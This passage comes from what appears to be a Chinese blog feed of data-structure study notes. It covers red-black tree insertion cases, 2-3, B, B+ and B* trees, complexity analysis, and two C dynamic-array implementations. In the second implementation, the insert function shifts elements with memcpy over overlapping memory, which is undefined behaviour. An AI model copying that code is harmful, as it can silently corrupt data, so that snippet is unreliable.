src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/05/16-59-15-4be212.png" srcset="/img/loading.gif" lazyload style="zoom:40%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/05/17-00-50-5daf37.png" srcset="/img/loading.gif" lazyload style="zoom:40%;"></p></li><li><p><em>x</em> 的叔父结点是黑色的，并且 <em>x</em> 是一个左孩子</p><p>将 <em>x</em> 的父结点改为黑色，祖父结点改为红色，并对 <em>x</em>的祖父结点进行右旋。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/05/17-02-00-197a12.png" srcset="/img/loading.gif" lazyload style="zoom:40%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/05/17-02-29-80ed32.png" srcset="/img/loading.gif" lazyload style="zoom:40%;"></p></li></ol><p>删除操作不写了，有点麻烦，也没那个兴趣从头实现，比较复杂的算法，照着伪代码实现挺耗时间的。</p><h2><span id="多路平衡二叉树">多路平衡二叉树</span></h2><p>在数据量较大的工程应用（如数据库）中，由于树中的结点信息往往保存在磁盘而非内存里，维护一棵平衡二叉查找树会导致大量的磁盘寻址和读写操作。而磁盘存取的时间要比CPU 运算的时间更长。</p><p>为了解决这个问题，可以通过每次存取连续多个数据项，来减少磁盘读写的时间开销。</p><p>平衡树是检索效率非常高的一类数据结构，但平衡树每个结点只能保存一个关键字。为了便于一次从磁盘中读入连续的多个数据，多路查找树来了。</p><p>将二叉查找改为多路查找，可以在降低查找深度的同时，在同一个结点内维护更多的信息，每次存取连续多个数据项，降低磁盘寻址和读写的时间开销，优化在磁盘上检索数据的性能。</p><p><strong>多路查找树（Multi-way search tree）</strong>是指树中结点最多有 <em>M</em> 个孩子。查找的时间效率依然可以保证为 <span class="math inline">\(O(\log(n))\)</span> 复杂度，并且树的深度更小。</p><h3><span id="2-3树">2-3树</span></h3><p>在 2-3 树中，有两种结点：2-node 和 3-node，表示每个结点有 2 个还是 3个孩子。</p><p>树中的 <strong>所有叶子结点都在同一层</strong>，叶子结点可以包含一个或两个关键字。</p><p>2-node <strong>一定</strong> 有两个孩子和一个关键字；3-node<strong>一定</strong> 有三个孩子和两个关键字。</p><p>3-node有三个子树，两个关键字的值划分了三段连续的区间，三个子树分别位于这三个区间内。</p><h3><span id="b树">B树</span></h3><p>一棵最小度数为 t (t &gt;= 2) 的 B树除了满足多路查找树的基本性质以外，还满足如下的性质：</p><ul><li>根结点至少有一个关键字，以及两个孩子结点；</li><li>所有内部结点至少有 <em>t</em> 个孩子结点，至多有 2<em>t</em>个孩子结点；</li><li>所有内部结点至少有 <em>t</em>−1 个关键字，至多有 2<em>t</em>−1个关键字；</li><li>每个叶子结点没有孩子。</li></ul><h4><span id="查找">查找</span></h4><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">search(<span class="hljs-keyword">node</span><span class="hljs-title">, key</span>)<br>    i = <span class="hljs-number">0</span><br>    while i <span class="hljs-tag">&lt; node-&gt;</span>count <span class="hljs-keyword">and</span> key &gt; <span class="hljs-keyword">node</span><span class="hljs-title">-&gt;keys</span>[i]<br>        i = i + <span class="hljs-number">1</span><br>    if i <span class="hljs-tag">&lt; node-&gt;</span>count <span class="hljs-keyword">and</span> key == <span class="hljs-keyword">node</span><span class="hljs-title">-&gt;keys</span>[i]<br>        return (<span class="hljs-keyword">node</span><span class="hljs-title">, i</span>)<br>    else if <span class="hljs-keyword">node</span><span class="hljs-title">-&gt;is_leaf</span><br>        return NIL<br>    else return search(<span class="hljs-keyword">node</span><span class="hljs-title">-&gt;childs</span>[i], key)<br></code></pre></div></td></tr></table></figure><p>每个node有count个子节点。</p><h4><span id="插入">插入</span></h4><p>节点的子节点个数是可以变化的，所以当达到一个节点的最大度数（或者关键字个数）需要将子节点中合适的关键字提升到父节点中，若父节点也满了，就继续提升。划分出更小的节点，再进行插入。</p><h4><span id="删除">删除</span></h4><p>B 树的删除操作需要在递归过程中确保所在结点的关键字个数<strong>不小于</strong> 最小度数 <em>t</em>。</p><h3><span id="b-树">B+ 树</span></h3><p>B+ 树和 B 树的不同之处在于：</p><ol type="1"><li>所有关键字都存放在叶结点中，非叶结点的关键字表示的是子树中所有关键字的最小值，这被称为<strong>最小复写码</strong>。也可以统一存储子树所有关键字的最大值。</li><li>叶结点包含了全部的关键字信息，并且叶结点之间按从小到大的顺序链接。</li><li>非叶子结点内并不需要真正保存关键字的具体信息，因此整体的磁盘读写开销会更小。</li><li>遍历叶子结点就可以从小到大遍历相邻的元素。</li></ol><p>因此，现有的数据库索引大多采用 B+ 树作为索引数据结构。</p><h3><span id="b-树">B * 树</span></h3><p>在 B*树中，内部结点（非根、非叶子）也增加了一个指向兄弟的指针。并且每个结点的关键字个数至少为关键字个数上限的<span class="math inline">\(\frac{2}{3}\)</span>。因为对下限的调整，所以B * 树的空间使用率比 B 树和 B+ 树更高。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> Data Structure </category>
          
      </categories>
      
      
        <tags>
            
            <tag> data structure </tag>
            
            <tag> cs basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构整理-part1</title>
      <link href="/posts/d828af60.html"/>
      <url>/posts/d828af60.html</url>
      
        <content type="html"><![CDATA[<h2><span id="导论">导论</span></h2><p><strong>数据结构</strong>是计算机存储、组织数据的方式，是指数据元素的集合以及数据元素之间存在的一种或者多种关系的集合</p><p>元素之间的关系包括数据的逻辑结构、数据的存储结构和数据的运算结构。</p><p><strong>数据</strong>是信息的载体，是可以被计算机识别存储并加工处理的描述客观事物的信息符号的总称。</p><p><strong>数据元素</strong>是数据的基本单位，在计算机程序中通常作为一个整体考虑。一个数据元素由若干个<strong>数据项</strong> 组成。</p><p>数据项是数据结构中讨论的最小单位。有两类数据元素：如果数据元素不能再分，则称为<strong>原子项</strong> ；如果数据元素由若干个数据项组成，则称为<strong>组合项</strong> 。</p><p>数据结构是一门研究<strong>非数值计算</strong>的学科，主要研究数据元素以及它们之间的关系和运算等，而且确保经过这些运算后所得到的<strong>新结构仍然是原来的结构类型</strong>。</p><p>数据结构有两个要素，一个是数据元素的集合，另一个是关系的集合。</p><ul><li>集合结构。数据元素属于同一个集合。</li><li>线性结构。数据元素之间存在着一对一的关系。常见的有链表、队列、栈等。</li><li>树形结构。数据元素之间存在着一对多的关系。常见的有二叉树、二叉查找树、平衡二叉查找树等。</li><li>图形结构。数据元素之间存在着多对多的关系。</li></ul><p>按照存储方式的不同，数据结构可以分为顺序存储结构和链式存储结构：</p><ul><li><p>顺序存储结构，表示数据元素在存储器中是连续存储的，可以用相对位置来表示数据元素之间的逻辑结构，如顺序表、队列、栈等。</p></li><li><p>链式存储结构，每个数据元素里设置了一个指针用来指向另一个元素的存储地址，以此来表示数据元素之间的逻辑结构。</p></li></ul><p>按照逻辑结构来分，数据结构可以分为线性结构和非线性结构</p><ul><li>如果数据元素之间存在一对一的关系，则称为线性结构</li><li>否则称为非线性结构。集合结构、树形结构、图形结构都称为非线性结构。</li></ul><p>算法（Algorithm）是对某一个或者某一类问题的解决方案的描述，根据问题的输入，在有限的计算时间里输出预期的结果。</p><p>算法有以下 5 个特征：</p><ul><li>有穷性。算法必须在执行有限个操作后终止。</li><li>确切性。算法的每一个操作必须有明确的定义。</li><li>输入项。算法有零个或多个输入，描述算法的初始状态。</li><li>输出项。算法有一个或多个输出，没有输出的算法我们认为是没有意义的。</li><li>可行性。算法的每个计算操作都可以在有限时间内完成。</li></ul><p>数据结构描述了数据元素之间的逻辑关系，算法描述了数据元素的操作步骤，数据结构和算法组成了程序世界。数据结构和算法之间是不可分割的关系，数据结构是程序的基础，算法将数据互相联系起来，形成了一套能解决具体问题的方案。</p><p>在解决问题时，一般我们会优先确定数据结构，然后再来完善算法，有时也会反过来，根据算法来选择合适的数据结构。选择一个合适的数据结构，可以降低算法的复杂度，提高算法的效率。</p><h3><span id="复杂度分析">复杂度分析</span></h3><h4><span id="时间复杂度">时间复杂度</span></h4><p>时间频度是指算法中语句的执行次数，用 T(n) 来表示， n为问题的规模。</p><p>时间频度的表达方法有点复杂，我们需要更直观的表达方法，于是引入了时间复杂度的概念。</p><p>函数 <em>f</em>(<em>n</em>)，在 <em>n</em> 趋向于无穷大时，<em>T</em>(<em>n</em>)/<em>f</em>(<em>n</em>) 的极限值为不等于 0的常数，则我们近似的将 <em>f</em>(<em>n</em>) 替代<em>T</em>(<em>n</em>)，记为<em>T</em>(<em>n</em>)=O(<em>f</em>(<em>n</em>))，称为算法的渐进时间复杂度。</p><p>时间复杂度只关心算法中最耗时的部分</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/Notes_pic/2021/10/03/21-25-38-27ff7a.png" srcset="/img/loading.gif" lazyload alt="常见复杂度级别"><figcaption aria-hidden="true">常见复杂度级别</figcaption></figure><h4><span id="空间复杂度">空间复杂度</span></h4><p>空间复杂度是指运行该算法所占用的存储空间大小，记为<em>S</em>(<em>n</em>)</p><p>预估出算法运行所需的存储空间，包括指令空间、数据空间、动态申请的内存空间等。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> *a = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];<br><span class="hljs-keyword">int</span> **b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>*[n];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    b[i] = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];<br>&#125;<br></code></pre></div></td></tr></table></figure><p><em>S</em>(<em>n</em>)=<em>n</em>+<em>n</em>^2，则空间复杂度为O(<em>n</em>^2)。</p><h3><span id="内容">内容</span></h3><p>数据结构I 包含了一些基础的数据结构，一共分为三部分：</p><ul><li>线性结构，包括顺序表、链表、队列、栈等；</li><li>树结构和图结构的入门，包括二叉树、图的存储方式等；</li><li>查找排序算法，包括哈希表、顺序查找、折半查找、三分查找等查找算法，和插入排序、冒泡排序、归并排序、选择排序和快速排序等排序算法。</li></ul><p>数据结构II 包含了一些进阶的数据结构，一共分为两部分：</p><ul><li>树结构，包括二叉查找树、平衡二叉查找树、堆与优先队列、森林与并查集等；</li><li>图结构，包括图的遍历、图的连通性、最短路和最小生成树等算法。</li></ul><h2><span id="线性表">线性表</span></h2><p>线性表是由 <strong>相同数据类型</strong> 的 <em>n</em>个数据元素组成的有限序列。</p><p>线性表按照存储结构，可以分为顺序表和链表两种类型。</p><h3><span id="顺序表">顺序表</span></h3><p>实现顺序表的构造、插入、扩容、查找、删除、遍历这 6种基本操作，并在本章最后用顺序表这个数据结构求解一道题目</p><p>顺序表是线性表的一种顺序存储形式。换句话说，线性表是逻辑结构，表示元素之间一对一的相邻关系；而顺序表是存储结构，是指用一组地址连续的存储单元，依次存储线性表中的数据元素，从而使得逻辑上相邻的两个元素在物理位置上也相邻。</p><p>顺序表在程序中通常用一维数组实现，一维数组可以是静态分配的，也可以是动态分配的。</p><blockquote><p>在静态分配时，由于数组的大小和空间是固定的</p><p>在动态分配时，存储数组的空间在程序执行过程中会动态调整大小</p></blockquote><ol type="1"><li>支持<strong>随机访问</strong></li><li>插入和删除操作需要移动大量的元素，从而保持逻辑上和物理上的连续性。</li></ol><p>堆里数组，同时使用一段连续地址，储存相同类型的有限数据序列。</p><hr><h4><span id="implement">implement</span></h4><h5><span id="实现一">实现一</span></h5><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ERROR 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> OK 1</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Vector</span> &#123;</span><br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span>, length;<br>    <span class="hljs-keyword">int</span> *data;<br>&#125; Vector;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(Vector *<span class="hljs-built_in">vector</span>, <span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span>)</span> </span>&#123;<br>    <span class="hljs-built_in">vector</span>-&gt;<span class="hljs-built_in">size</span> = <span class="hljs-built_in">size</span>;<br>    <span class="hljs-built_in">vector</span>-&gt;length = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">vector</span>-&gt;data = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * <span class="hljs-built_in">size</span>);<br>&#125;<br><br><span class="hljs-comment">// 请在下面实现扩容函数 expand</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">expand</span><span class="hljs-params">(Vector *<span class="hljs-built_in">vector</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> *old_data = <span class="hljs-built_in">vector</span>-&gt;data;<br>    <span class="hljs-built_in">vector</span>-&gt;<span class="hljs-built_in">size</span> = <span class="hljs-built_in">vector</span>-&gt;<span class="hljs-built_in">size</span> * <span class="hljs-number">2</span>;<br>    <span class="hljs-built_in">vector</span>-&gt;data = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * <span class="hljs-built_in">vector</span>-&gt;<span class="hljs-built_in">size</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">vector</span>-&gt;length; ++i) &#123;<br>        <span class="hljs-built_in">vector</span>-&gt;data[i] = old_data[i];<br>    &#125;<br>    <span class="hljs-built_in">free</span>(old_data);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">insert</span><span class="hljs-params">(Vector *<span class="hljs-built_in">vector</span>, <span class="hljs-keyword">int</span> loc, <span class="hljs-keyword">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (loc &lt; <span class="hljs-number">0</span> || loc &gt; <span class="hljs-built_in">vector</span>-&gt;length) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">vector</span>-&gt;length &gt;= <span class="hljs-built_in">vector</span>-&gt;<span class="hljs-built_in">size</span>) &#123;<br>        <span class="hljs-comment">// return ERROR;</span><br>        expand(<span class="hljs-built_in">vector</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-built_in">vector</span>-&gt;length; i &gt; loc; --i) &#123;<br>        <span class="hljs-built_in">vector</span>-&gt;data[i] = <span class="hljs-built_in">vector</span>-&gt;data[i - <span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-built_in">vector</span>-&gt;data[loc] = value;<br>    <span class="hljs-built_in">vector</span>-&gt;length++;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">search</span><span class="hljs-params">(Vector *<span class="hljs-built_in">vector</span>, <span class="hljs-keyword">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">vector</span>-&gt;length; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">vector</span>-&gt;data[i] == value) &#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">delete_node</span><span class="hljs-params">(Vector *<span class="hljs-built_in">vector</span>, <span class="hljs-keyword">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span> || index &gt;= <span class="hljs-built_in">vector</span>-&gt;length) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;   <br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = index + <span class="hljs-number">1</span>; i &lt; <span class="hljs-built_in">vector</span>-&gt;length; ++i) &#123;<br>        <span class="hljs-built_in">vector</span>-&gt;data[i - <span class="hljs-number">1</span>] = <span class="hljs-built_in">vector</span>-&gt;data[i];<br>    &#125;<br>    <span class="hljs-built_in">vector</span>-&gt;length--;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">(Vector *<span class="hljs-built_in">vector</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">vector</span>-&gt;length; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">" "</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>, <span class="hljs-built_in">vector</span>-&gt;data[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(Vector *<span class="hljs-built_in">vector</span>)</span> </span>&#123;<br>    <span class="hljs-built_in">free</span>(<span class="hljs-built_in">vector</span>-&gt;data);<br>    <span class="hljs-built_in">free</span>(<span class="hljs-built_in">vector</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Vector *a = (Vector *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Vector));<br>    init(a, <span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, insert(a, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, insert(a, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, insert(a, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, insert(a, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, insert(a, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>));<br>    <span class="hljs-built_in">clear</span>(a);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5><span id="实现二">实现二</span></h5><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ERROR 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> OK 1</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">错误处理还不严谨，使用mem操作，比上一个for循环高效</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Vector</span> &#123;</span><br>    <span class="hljs-keyword">int</span> s, l;<br>    <span class="hljs-keyword">int</span> *d;<br>&#125; Vector;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(Vector *v, <span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!v) <span class="hljs-keyword">return</span>;<br>    v-&gt;s = <span class="hljs-built_in">size</span>;<br>    v-&gt;l = <span class="hljs-number">0</span>;<br>    v-&gt;d = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">size</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">expand</span><span class="hljs-params">(Vector *v)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!v) <span class="hljs-keyword">return</span> ERROR;<br>    <span class="hljs-keyword">int</span> expandsize = v-&gt;s;<br>    <span class="hljs-keyword">int</span> *tmp = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span> (expandsize) &#123;<br>        <span class="hljs-comment">// realloc, append v-&gt;d. If necessary, copy to a bigger memory block.</span><br>        tmp = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">realloc</span>(v-&gt;d, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * (v-&gt;s + expandsize));<br>        <span class="hljs-keyword">if</span> (tmp) <span class="hljs-keyword">break</span>;<br>        expandsize &gt;&gt;= <span class="hljs-number">2</span>; <br>    &#125;<br>    <span class="hljs-keyword">if</span> (!tmp) <span class="hljs-keyword">return</span> ERROR;<br>    v-&gt;d = tmp;<br>    v-&gt;s += expandsize;<br>    <span class="hljs-comment">// printf("Expand succeed");</span><br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">insert</span><span class="hljs-params">(Vector *v, <span class="hljs-keyword">int</span> loc, <span class="hljs-keyword">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!v) <span class="hljs-keyword">return</span> ERROR;<br>    <span class="hljs-keyword">if</span> (loc &lt; <span class="hljs-number">0</span> || loc &gt; v-&gt;l) <span class="hljs-keyword">return</span> ERROR;<br>    <span class="hljs-keyword">if</span> (v-&gt;s &lt;= v-&gt;l) &#123;<br>        <span class="hljs-keyword">if</span> (!expand(v)) <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-built_in">memcpy</span>(v-&gt;d + loc + <span class="hljs-number">1</span>, v-&gt;d + loc, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * (v-&gt;l - loc));<br>    v-&gt;d[loc] = value;<br>    v-&gt;l++;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">search</span><span class="hljs-params">(Vector *v, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!v) <span class="hljs-keyword">return</span> ERROR;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; v-&gt;l; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (*(v-&gt;d + i) == target)<br>            <span class="hljs-keyword">return</span> i + <span class="hljs-number">1</span>; <span class="hljs-comment">// return index begin from 1</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> ERROR;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">delete_node</span><span class="hljs-params">(Vector *v, <span class="hljs-keyword">int</span> loc)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!v) <span class="hljs-keyword">return</span> ERROR;<br>    <span class="hljs-keyword">if</span> (loc &lt; <span class="hljs-number">0</span> || loc &gt;= v-&gt;l) <span class="hljs-keyword">return</span> ERROR;<br>    <span class="hljs-built_in">memcpy</span>(v-&gt;d + loc, 